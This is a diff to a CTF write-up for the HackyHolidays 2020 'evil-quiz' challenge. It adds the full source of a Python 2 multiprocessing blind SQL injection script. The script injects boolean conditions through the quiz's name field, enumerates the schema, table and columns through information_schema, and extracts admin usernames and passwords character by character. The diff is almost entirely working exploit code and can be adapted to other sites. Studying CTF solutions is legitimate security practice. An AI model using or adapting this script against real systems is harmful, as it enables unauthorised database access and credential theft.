@@ -125,7 +125,188 @@ Since there is no knowledge of the database schema and its tables, querying the 
 
 #### Blind SQLi Script
 
-My exploit script can be found [here](evil-quiz-exploit.py).
+My exploit script is as thus:
+```py
+#
+# Python 2 Blind SQL Injection Script w/ Multiprocessing
+#
+# Author: https://github.com/limerencee
+# Created during: HackerOne HackyHolidays 2020 CTF
+#
+#
+# Usage:
+# In main(), decide if you want to run full_enum() or the speed_run()
+# by commenting out either functions. Adjust the number of threads under
+# POOL_WORKERS global variable (default 12).
+#
+# $ python evil-quiz-exploit.py
+#
+
+import requests
+import sys
+from multiprocessing import Pool
+
+MAX_GUESS_LENGTH = 256
+POOL_WORKERS = 12
+
+output = []
+pool = None
+
+def get_result():
+    global output
+    result = None
+
+    if len(output) > 0:
+        result = "".join(output)
+        output = []
+
+    sys.stdout.write("\n")
+    return str(result)
+
+def log_result(result):
+    global output
+
+    if result:
+        pool.terminate()
+
+        if result in range(32, 127):
+            char = chr(result)
+            output.append(char)
+            sys.stdout.write(char)
+            sys.stdout.flush()
+        else:
+            length = str(result)
+            output.append(length)
+
+def multi_request(inj, c):
+    # Init cookie
+    s = requests.Session()
+    s.get('https://hackyholidays.h1ctf.com/evil-quiz')
+
+    # Set guess character
+    data = {
+        "name": inj.replace("[CHAR]", str(c))
+    }
+
+    # Send payload
+    s.post('https://hackyholidays.h1ctf.com/evil-quiz', data=data)
+
+    # Mandatory requests
+    s.get('https://hackyholidays.h1ctf.com/evil-quiz/start')
+    s.post('https://hackyholidays.h1ctf.com/evil-quiz/start', data={"ques_1": 0, "ques_2": 0, "ques_3": 0})
+
+    res = s.get('https://hackyholidays.h1ctf.com/evil-quiz/score')
+    if "is 0 other" not in res.text:
+        return c
+    return False
+
+def inject(inj):
+    global pool
+    pool = Pool(POOL_WORKERS)
+
+    for c in range(32,127):
+        pool.apply_async(multi_request, [inj, c], callback=log_result)
+    pool.close()
+    pool.join()
+
+def inject_len(query):
+    global pool
+    pool = Pool(POOL_WORKERS)
+
+    for i in range(1, MAX_GUESS_LENGTH + 1):
+        inj = "' AND (SELECT IF(LENGTH(({}))={}, 1, 0)); -- -".format(query, i)
+        pool.apply_async(multi_request, [inj, i], callback=log_result)
+    pool.close()
+    pool.join()
+
+def inject_count(query):
+    global pool
+    pool = Pool(POOL_WORKERS)
+
+    for i in range(1, MAX_GUESS_LENGTH + 1):
+        inj = "' AND (SELECT IF(({})={}, 1, 0)); -- -".format(query, i)
+        pool.apply_async(multi_request, [inj, i], callback=log_result)
+    pool.close()
+    pool.join()
+
+def sqli_query(query, length):
+    for i in range(1, int(length) + 1):
+        inj = "' AND (SELECT IF(ASCII(SUBSTR(({}),{},1))=[CHAR], 1, 0)); -- -".format(query, i)
+        orig_output = len(output)
+        inject(inj)
+        updated_output = len(output)
+        if orig_output == updated_output:
+            break
+    return get_result()
+
+def sqli_len_query(query):
+    if "COUNT(" in query:
+        inject_count(query)
+    else:
+        inject_len(query)
+    return get_result()
+
+def full_enum():
+    # Enumerate Schema Name
+    query_schema = "SELECT table_schema FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT 1"
+    schema_len = sqli_len_query(query_schema)
+    print "[+] Schema Name Length: {}".format(schema_len)
+    schema_name = sqli_query(query_schema, schema_len)
+    print "[+] Schema Name: {}\n".format(schema_name)
+
+    # Enumerate Table Name
+    query_table_name = "SELECT table_name FROM information_schema.tables WHERE table_schema = '{}' LIMIT 1".format(schema_name)
+    table_name_len = sqli_len_query(query_table_name)
+    print "[+] Table Name Length: {}".format(table_name_len)
+    table_name = sqli_query(query_table_name, table_name_len)
+    print "[+] Table Name: {}\n".format(table_name)
+
+    # Enumerate Columns
+    # Get number of columns
+    query_table_columns_len = "SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = '{}' AND table_name = '{}'".format(schema_name, table_name)
+    col_count = sqli_len_query(query_table_columns_len)
+    print "[+] Number of Columns: {}".format(col_count)
+
+    # Enumerate all column names
+    columns = []
+    for i in range(0, int(col_count)):
+        print "[+] Column #{}".format(i+1)
+        query_table_columns = "SELECT column_name FROM information_schema.columns WHERE table_schema = '{}' AND table_name = '{}' LIMIT 1 OFFSET {}".format(schema_name, table_name, i)
+        col_len = sqli_len_query(query_table_columns)
+        print "[+] Column Name Length: {}".format(col_len)
+        col_name = sqli_query(query_table_columns, col_len)
+        print "[+] Column Name: {}\n".format(col_name)
+        columns.append(col_name)
+
+    # Exfiltrate row
+    print "[+] Enumerating Row from '{}.{}'...".format(schema_name, table_name)
+    for column in columns:
+        query_table_content = "SELECT {} FROM {}.{} LIMIT 1".format(column, schema_name, table_name)
+        row_len = sqli_len_query(query_table_content)
+        print "[+] '{}' Length: {}".format(column, row_len)
+        row_value = sqli_query(query_table_content, row_len)
+        print "[+] {}: {}\n".format(column, row_value)
+
+def speed_run():
+    query_username = "SELECT username FROM quiz.admin LIMIT 1"
+    username_len = sqli_len_query(query_username)
+    print "[+] 'username' Length: {}".format(username_len)
+    username = sqli_query(query_username, username_len)
+    print "[+] 'username': {}\n".format(username)
+
+    query_password = "SELECT password FROM quiz.admin WHERE username = '{}'".format(username)
+    password_len = sqli_len_query(query_password)
+    print "[+] 'password' Length: {}".format(password_len)
+    password = sqli_query(query_password, password_len)
+    print "[+] 'password': {}\n".format(password)
+
+def main():
+    full_enum()
+    # speed_run()
+
+if __name__ == "__main__":
+    main()
+```
 
 This was the output obtained upon using the script that I created:
 ```bash
